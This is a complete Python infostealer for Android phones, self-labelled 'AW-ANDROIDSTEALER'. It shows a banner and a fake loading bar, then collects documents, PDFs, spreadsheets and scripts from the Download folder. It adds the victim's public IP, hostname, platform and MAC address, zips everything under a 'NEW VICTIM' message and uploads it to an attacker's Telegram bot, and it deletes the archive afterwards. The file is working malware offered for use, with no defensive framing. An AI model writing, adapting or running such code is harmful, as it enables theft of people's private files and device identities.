import os
import platform
import socket
import zipfile
import requests
import sys
import time
import uuid
import re  # Added for MAC address formatting
from pathlib import Path

os.system('clear')

# ASCII art banner function
def print_banner():
    banner = r"""

   _                   _           _     _     ___       _   
  /_\  _ __   ___   __| |_ __ ___ (_) __| |   / __\ ___ | |_ 
 //_\\| '_ \ / _ \ / _` | '__/ _ \| |/ _` |  /__\/// _ \| __|
/  _  \ | | | (_) | (_| | | | (_) | | (_| | / \/  \ (_) | |_ 
\_/ \_/_| |_|\___/ \__,_|_|  \___/|_|\__,_| \_____/\___/ \__|
                                                             

                                                    
    """
    print("\033[1;33m" + banner + "\033[0m")

# Function to get public IP address using an alternative method
def get_public_ip():
    try:
        # Use a different service to fetch public IP address
        response = requests.get('https://api.ipify.org?format=json', timeout=10)
        ip = response.json()['ip']
        return ip
    except requests.RequestException as e:
        print(f"Failed to retrieve public IP: {e}")
        return None

# Function to find specific file types and collect their paths in /sdcard/Download directory
def find_files():
    download_dir = '/sdcard/Download/'
    file_types = ['.txt', '.doc', '.docm', '.docx', '.pdf', '.xls', '.dat', '.py']
    files_found = []
    for root, _, files in os.walk(download_dir):
        for file in files:
            if any(file.lower().endswith(ext) for ext in file_types):
                files_found.append(os.path.join(root, file))
    return files_found

# Function to gather system information
def get_system_info():
    return {
        'Platform': platform.platform(),
        'Processor': platform.processor(),
        'System': platform.system(),
        'MAC Address': ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    }

# Function to create a ZIP archive with collected data
def create_zip(files, system_info):
    zip_filename = 'AW-ANDROIDSTEALER.By-K.zip'
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for file in files:
            # Handling duplicate file names by appending suffix
            if os.path.basename(file) in zipf.namelist():
                base, ext = os.path.splitext(os.path.basename(file))
                count = 1
                while f"{base}_{count}{ext}" in zipf.namelist():
                    count += 1
                zipf.write(file, f"{base}_{count}{ext}")
            else:
                zipf.write(file, os.path.basename(file))
        # Create the message text to be included in the ZIP file
        info_text = (
            f"☣️  NEW VICTIM ☢️\n"
            f"⚡ AW.STEALER ⚡\n"
            f"   Files Successfully Stolen ✅\n"
            f"   Victim IP: {get_public_ip()}\n"
            f"   Device Name: {socket.gethostname()}\n"
            f"   Platform: {system_info['Platform']}\n"
            f"   System: {system_info['System']}\n"
            f"   MAC Address: {system_info['MAC Address']}\n"
        )
        zipf.writestr('Deviceinfo.txt', info_text)
    return zip_filename

# Function to send data to Telegram bot
def send_to_telegram_bot(zip_filename, system_info):
    # Replace with your Telegram bot API token and chat ID
    bot_token = 'HERE BOT TOKEN'
    chat_id = 'HERE CHAT ID'

    try:
        with open(zip_filename, 'rb') as file:
            files = {'document': file}
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            response = requests.post(url, files=files, data={'chat_id': chat_id})
            if response.status_code == 200:
                print("ZIP file sent successfully to Telegram bot!")
                # Send system information as a plain text message
                message_text = (
                    f"☢️  NEW VICTIM ☣️\n"
                    f"   AW.STEALER\n"
                    f"   Files Successfully Stolen\n"
                    f"   Victim IP: {get_public_ip()}\n"
                    f"   Device Name: {socket.gethostname()}\n"
                    f"   Processor: {system_info['Processor']}\n"
                    f"   System: {system_info['System']}\n"
                    f"   MAC Address: {system_info['MAC Address']}\n"
                )
                url_message = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                response_message = requests.post(url_message, data={'chat_id': chat_id, 'text': message_text})
                if response_message.status_code != 200:
                    print(f"Failed to send message. Status code: {response_message.status_code}")
            else:
                print(f"Failed to send data. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Failed to send data: {e}")
    finally:
        # Delete the ZIP file after sending to bot
        os.system(f'rm -rf {zip_filename}')

# Loading animation function
def loading_animation():
    for i in range(101):
        # Clear the line
        sys.stdout.write("\033[K")
        # Print the progress bar
        sys.stdout.write(f"\rLoading: [{i:3}%] {'=' * (i // 5)}{' ' * (20 - i // 5)}")
        sys.stdout.flush()
        time.sleep(0.1)
    print("\nstarting..")

if __name__ == "__main__":
    try:
        print_banner()  # Print ASCII art banner
        loading_animation()  # Run loading animation
        files = find_files()  # Find relevant files
        system_info = get_system_info()  # Get system information
        zip_filename = create_zip(files, system_info)  # Create ZIP archive
        send_to_telegram_bot(zip_filename, system_info)  # Send data to Telegram bot with system info
    except Exception as e:
        print(f"An error occurred: {e}")
